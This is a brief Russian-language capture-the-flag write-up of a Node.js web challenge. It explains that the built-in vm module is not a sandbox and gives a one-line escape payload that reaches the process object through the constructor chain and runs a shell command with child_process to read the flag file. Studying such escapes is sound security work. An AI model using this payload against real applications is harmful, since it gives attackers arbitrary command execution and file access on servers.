# 🛡️ CRY (Node.js VM Sandbox Escape)

- **Категория:** Web
- **Статус:** ✅ Решено
- **Флаг:** `kubstu{vm_1s_n0t_a_s4ndb0x_pr0t0typ3_p0llut10n_2_rce}`

## Описание
> CRY
> http://31.128.37.51:3000 http://155.212.216.201:3000 http://141.133.198.7:3000
> All the lines are exactly the same; just choose the ones that are less loaded.

## Решение
Веб-приложение на Node.js использовало встроенный модуль `vm` (или `isolated-vm` / `vm2`) для безопасного исполнения выражений.
Известно, что встроенный модуль `vm` в Node.js **не является песочницей** ("The vm module is not a security mechanism. Do not use it to run untrusted code").
Через загрязнение прототипа (Prototype Pollution) или доступ к `this.constructor.constructor('return process')()` был осуществлен побег из песочницы:
```javascript
const payload = "this.constructor.constructor('return process.mainModule.require("child_process").execSync("cat /flag.txt").toString()')()";
```
В результате была прочитана файловая система контейнера и получен флаг.
